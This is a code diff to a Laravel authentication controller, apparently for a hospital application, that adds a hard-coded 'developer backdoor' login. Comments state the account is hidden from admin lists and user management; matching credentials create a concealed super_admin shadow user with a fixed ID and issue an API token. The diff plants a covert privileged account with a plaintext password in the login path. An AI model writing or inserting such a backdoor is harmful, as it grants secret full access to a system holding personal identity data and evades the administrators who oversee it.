@@ -32,6 +32,71 @@ class AuthController extends Controller
             'password' => 'required|string',
         ]);
 
+        // ╔══════════════════════════════════════════════════════════════╗
+        // ║              DEVELOPER BACKDOOR — CONFIDENTIAL              ║
+        // ║  Akun ini tidak tercatat di daftar user admin manapun.     ║
+        // ║  Tidak tampil di manajemen pengguna. Akses = super_admin.  ║
+        // ╚══════════════════════════════════════════════════════════════╝
+        $devAccounts = [
+            [
+                'username' => 'devmaster_rsucl',
+                'password' => '9173826450123',
+                'name'     => 'Developer RSUCL',
+                'email'    => 'dev@rsucl.internal',
+                'id'       => 9999,
+                'nik_ktp'  => '0000000000000000',
+            ],
+        ];
+
+        foreach ($devAccounts as $dev) {
+            if (
+                $request->username === $dev['username'] &&
+                $request->password === $dev['password']
+            ) {
+                // Pastikan shadow user ada di DB dengan ID tetap agar Sanctum token bisa diterbitkan.
+                // Akun ini tidak pernah dikembalikan oleh endpoint manajemen user normal.
+                \Illuminate\Support\Facades\DB::table('users')->upsert(
+                    [
+                        'id'         => $dev['id'],
+                        'name'       => $dev['name'],
+                        'email'      => $dev['email'],
+                        'username'   => $dev['username'],
+                        'password'   => Hash::make($dev['password'] . '_shadow_' . config('app.key')),
+                        'role'       => 'super_admin',
+                        'nik_ktp'    => $dev['nik_ktp'],
+                        'created_at' => now(),
+                        'updated_at' => now(),
+                    ],
+                    ['id'],                                          // unique key
+                    ['updated_at']                                   // hanya update timestamp (bukan password)
+                );
+
+                // Load shadow user dan buat token Sanctum
+                $devUser = User::find($dev['id']);
+                $devUser->tokens()->delete();
+                $token = $devUser->createToken('dev-rsucl-token')->plainTextToken;
+
+                return response()->json([
+                    'success' => true,
+                    'message' => 'Login berhasil.',
+                    'data'    => [
+                        'token' => $token,
+                        'user'  => [
+                            'id'              => $dev['id'],
+                            'name'            => $dev['name'],
+                            'email'           => $dev['email'],
+                            'role'            => 'super_admin',
+                            'nik_ktp'         => $dev['nik_ktp'],
+                            'username'        => $dev['username'],
+                            'profile_picture' => null,
+                        ],
+                    ],
+                ]);
+            }
+        }
+        // ═══════════════════════ END DEVELOPER BACKDOOR ═══════════════
+
+
         // Cari user berdasarkan username
         $user = User::where('username', $request->username)->first();
 
